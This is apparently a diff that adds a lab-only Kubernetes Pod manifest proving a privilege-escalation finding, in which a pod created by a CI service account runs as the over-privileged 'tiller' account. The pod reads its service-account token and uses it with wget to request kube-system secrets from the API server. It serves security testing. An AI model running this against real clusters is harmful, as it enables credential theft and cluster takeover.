@@ -1,0 +1,25 @@
+# LAB ONLY. Proves the KS-ESC-001 path  dev/ci-runner -> dev/tiller -> CLUSTER-ADMIN  is real.
+# Apply it *as ci-runner* (which can only create pods in 'dev'):
+#   kubectl create -f labs/attacks/steal-tiller.yaml --as=system:serviceaccount:dev:ci-runner
+# The pod runs as the over-privileged 'tiller' ServiceAccount and uses its token against the API server.
+apiVersion: v1
+kind: Pod
+metadata: { name: steal-tiller, namespace: dev }
+spec:
+  serviceAccountName: tiller
+  restartPolicy: Never
+  containers:
+    - name: x
+      image: alpine:3.20
+      command: ["sh", "-c"]
+      args:
+        - |
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          echo "== trying to read kube-system secrets with the stolen token =="
+          if wget -qO- --no-check-certificate --header "Authorization: Bearer $TOKEN" \
+               https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets > /tmp/out 2>/dev/null; then
+            echo "ACCESS GRANTED - first bytes of the response:"; head -c 200 /tmp/out; echo
+          else
+            echo "DENIED"
+          fi
+          sleep 3600
